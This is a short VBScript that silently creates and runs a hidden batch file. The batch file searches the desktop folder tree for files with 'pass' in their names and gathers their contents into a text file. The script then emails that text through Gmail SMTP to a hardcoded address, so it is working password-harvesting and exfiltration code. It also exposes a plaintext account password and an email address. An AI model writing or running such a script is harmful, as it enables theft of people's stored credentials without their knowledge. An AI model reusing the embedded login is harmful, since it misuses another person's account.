
 Const ForReading = 1
Dim file, content
 Dim f
 Dim fso







 Set fso = CreateObject("Scripting.FileSystemObject")

 Set f = fso.CreateTextFile("C:\Users\Alexandru Andercou\Desktop\file1.bat", True, True)
f.Close

Set f=fso.OpenTextFile("C:\Users\Alexandru Andercou\Desktop\file1.bat", 2)

  f.WriteLine("cd C /:Users//Desktop")
  f.Write("for /F ""delims=""  %%a in ('dir /s /b *pass*') do  ((echo  | (type ""%%a"") & echo:) >> find_passwords.txt)")
  f.Close




Set shell = CreateObject("WScript.Shell")
shell.Run  "file1.bat", 0, True




Set file = fso.OpenTextFile("C:\\Users\\Alexandru Andercou\\Desktop\\find_passwords.txt", ForReading)
content = file.ReadAll

MsgBox(content )

Dim emailObj  
Set emailObj      = CreateObject("CDO.Message")

emailObj.From     = "sandu.andercou@gmail.com"
emailObj.To       = "sandu.andercou@gmail.com"

emailObj.Subject  = "Test CDO"
emailObj.TextBody = content

Set emailConfig = emailObj.Configuration

emailConfig.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.gmail.com"
emailConfig.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 587
emailConfig.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing")    = 2  
emailConfig.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
emailConfig.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl")      = True
emailConfig.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendtls")          = True
emailConfig.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusername")    = "sandu.andercou@gmail.com"
emailConfig.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword")    = "000sandu2123"

emailConfig.Fields.Update

emailObj.Send

If err.number = 0 then Msgbox "Done"